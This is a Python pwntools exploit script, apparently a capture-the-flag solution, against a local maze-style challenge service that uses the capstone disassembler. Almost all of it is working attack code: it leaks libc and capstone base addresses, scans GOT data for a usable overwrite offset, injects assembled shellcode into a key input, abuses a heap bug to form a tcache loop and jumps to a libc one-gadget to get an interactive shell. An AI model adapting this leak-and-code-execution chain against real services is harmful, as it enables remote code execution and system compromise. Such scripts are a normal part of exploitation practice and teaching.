from pwn import *
from capstone import *

def respline(question, answer, ack = None):
    ret1 = None
    ret2 = None
    if question != "":
        ret1 = io.recvuntil(question)
    io.sendline(str(answer)) ## sendline instead of send
    if ack:
        ret2 = io.recvuntil(ack)
    return (ret1, ret2)

io = remote('127.0.0.1', 13371)
context.arch = 'amd64'
#context.log_level = 'debug'

libc_onegadget_offset = 0x4F040 #jz
libc_onegadget_offset = 0x10A24D #jne

libc_free_offset = 0x97950
libc_strlen_offset = 0x18e590
libc_stackcheck_offset = 0x134c80
libc_setbuf_offset = 0x884d0
libc_snprintf_offset = 0x64f50
libc_strncat_offset = 0xb9e20
libc_alarm_offset = 0xe4840
libc_memcmp_offset = 0x18aba0
libc_calloc_offset = 0x9a030
libc_getchar_offset = 0x87f00
libc_signal_offset = 0x3eda0
libc_fprintf_offset = 0x64dc0
libc_malloc_offset = 0x97070
libc_realloc_offset = 0x98c30
libc_scanf_offset = 0x7bec0
libc_exit_offset = 0x43120
libc_fwrite_offset = 0x7f8a0

cs_cs_option_offset = 0x49870
cs_cs_free_offset = 0x4a190
cs_cs_disasm_iter_offset = 0x4a260
cs_cs_malloc_offset = 0x4a1e0
cs_cs_open_offset = 0x49690
cs_cs_close_offset = 0x497c0

got = [
	('libc', libc_free_offset),
	('cs', cs_cs_option_offset),
	('cs', cs_cs_free_offset),
	('libc', libc_strlen_offset),
	('libc', libc_stackcheck_offset),
	('libc', libc_setbuf_offset),
	('libc', libc_snprintf_offset),
	('libc', libc_strncat_offset),
	('libc', libc_alarm_offset),
	('libc', libc_memcmp_offset),
	('libc', libc_calloc_offset),
	('libc', libc_getchar_offset),
	('libc', libc_signal_offset),
	('libc', libc_fprintf_offset),
	('cs', cs_cs_disasm_iter_offset),
	('cs', cs_cs_malloc_offset),
	('libc', libc_malloc_offset),
	('libc', libc_realloc_offset),
	('cs', 	cs_cs_open_offset),
	('libc', libc_scanf_offset),
	('libc', libc_exit_offset),
	('libc', libc_fwrite_offset),
	('cs', cs_cs_close_offset)
]

def apply_directions(d):
	for c in d:
		respline('(< ^ >)', c)

def apply_instructions(ins):
	for t, d in ins:
		if t == 'b':
			apply_directions(d)
		else:
			for yn in d:
				respline('(y/n)', yn)

def advance_level():
	apply_directions('>>><<>><<><<<')
	respline('(y/n)', 'n')
	respline('(y/n)', 'y')

def to_switch(key):
	apply_directions('>>><<<<<>><')
	respline('(y/n)', 'n')
	apply_directions('>')
	respline('(y/n)', 'y')
	respline('see: ', key)
	apply_directions('>><')

# leverage bug1 in order to figure out offsets	
traverse_offset = 0x21a8
def leak_addr(ins):
	for _ in range(14):
		advance_level()	
	apply_instructions(ins)

	for _ in range(5):
		apply_instructions([('f', 'n'), ('b', '><'), ('f', 'n'), ('b', '<<<')])

	io.recvuntil('stack top ')
	leak = int(io.recvuntil(' '), 16)
	io.recvuntil('real address ')
	ref_leak = int(io.recvuntil('\n'), 16)
	return leak - ref_leak + traverse_offset

def test_leak():
	# leak sequence for call_stack_push
	leak = leak_addr([('b', '>><<<>><<<'), ('f', 'ynn'), ('b', '><'), ('f', 'n'), ('b', '<<<')])
	print hex(leak)

key = "432f334067d6d28ade7f7a0b20e6b813".upper()

def leak_libs():
	to_switch(key)

	data = io.recvuntil('__)')
	depth = int(re.search('Depth: +([0-9]*) fathoms', data).group(1))

	respline('will take', -527831) # 0x3bf -> libc

	all_data = ''
	while True:
		hdr = io.recvuntil(':')
		if hdr.find('__|') != -1:
			break

		if hdr.find('read') != -1:
			data = io.recvuntil(' [ ')[:-3].replace('\n', '').replace(' ', '')
			all_data += data.decode('hex')
			#respline('choice:', '<')
		elif hdr.find('y/n') != -1:
			io.sendline('n')	
		elif hdr.find('choice') != -1:
			io.sendline('<')

	libc_leak = u64(all_data[1:7].ljust(8, '\x00'))
	libc_base = libc_leak - libc_signal_offset

	cs_base = libc_base + 0x3f1000

	apply_instructions([('f', 'n'), ('b', '>'), ('f', 'n')])

	return cs_base, libc_base

def determine_block_count(got_data):
	counts = {}

	md = Cs(CS_ARCH_X86, CS_MODE_64)
	md.detail = True

	# we intially iterated through all GOT entries, trying to find convenient ones to overwrite
	# in the end, only offset 0x78 proved to be appropriate

	#for offset in range(8, 0xb8, 0x10):
	#for offset in [0x48, 0x58, 0x78, 0x98, 0xa8]:
	for offset in [0x78]:
		data = got_data[offset:]
		insns = md.disasm(data, len(data))
		blocks = 0

		for i in insns:
			jcnd = 0
			call = 0
			for g in i.groups:
				if g == CS_GRP_JUMP:
					jcnd = 1
				elif g == CS_GRP_CALL:
					call = 1

			if jcnd and not call:
				blocks += 1

		counts[offset] = blocks

	return counts


apply_instructions([('b', '<'), ('f', 'n'), ('f', 'y')])

#context.log_level = 'debug'
cs_base, libc_base = leak_libs()
print 'binary: 0x%x\nlibc: 0x%x\ncapstone: 0x%x' % (0, libc_base, cs_base)

apply_directions('>><<>><<><<<')
respline('(y/n)', 'n')
respline('(y/n)', 'y')

for _ in range(11):
	advance_level()	

# here we search for a GOT address that, if chosen as a traversal target, leads to exactly 5 traversed blocks
got_data = ''.join(p64(libc_base + offset) if lib == 'libc' else p64(cs_base + offset) for (lib, offset) in got)
bl_cnts = determine_block_count(got_data)

print bl_cnts
offset = [i for i in bl_cnts if bl_cnts[i] == 5][0]

target = libc_base + libc_onegadget_offset
key_payload = key
key_payload += p64(target) + asm('''
	call $-0x%x; \
	jmp [rip-0x%x]; \
	je $-2
''' % (0x190 - offset, 19))

to_switch(key_payload)
respline('will take', 0)
apply_directions('><>' * 130)

# upwards from retrieve_block_cmpval
apply_instructions([('b', '<>>'), ('f', 'n'), ('b', '<<'), ('f', 'n'), ('b', '<>>')])

# upwards from traverse
for _ in range(3):
	apply_instructions([('f', 'n'), ('b', '><>>')])

# advance to handle_call
apply_instructions([('f', 'n')])#, ('b', '>><<<>><<><>')])

# traverse a loop and use bug4 to obtain a tcache loop
apply_instructions([('b', '>>><<>><<><>'), ('f', 'y'), ('b', '>>' * (198 + 2) + '>' + '^' * 6)])
apply_instructions([('b', '^' * 12), ('f', 'nnn'), ('b', '^' * 14)])
apply_instructions([('f', 'n'), ('b', '^' * 2)])
respline('will take', -527334) # 0x4f0 -> buffer
respline('(y/n)', 'y')
apply_directions('<' * 5 + '>')
respline('(y/n)', 'y')

#gdb.attach(io)
io.interactive()
